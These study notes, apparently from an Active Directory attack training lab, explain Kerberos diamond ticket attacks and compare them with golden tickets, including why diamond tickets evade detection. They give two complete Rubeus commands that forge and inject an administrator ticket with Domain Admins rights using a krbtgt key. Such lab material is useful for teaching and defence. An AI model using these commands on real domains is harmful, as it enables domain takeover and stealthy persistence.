*  A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account.
*  Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT
modification attack.
*  Once again, the persistence lifetime depends on krbtgt account.
*  A diamond ticket is more opsec safe as it has:
1. Valid ticket times because a TGT issued by the DC is modified
2. In golden ticket, there is no corresponding TGT request forTGS/Service ticket requests as the TGT is forged.

* We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):
```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
/user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator
/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt
```
*  We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
```
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
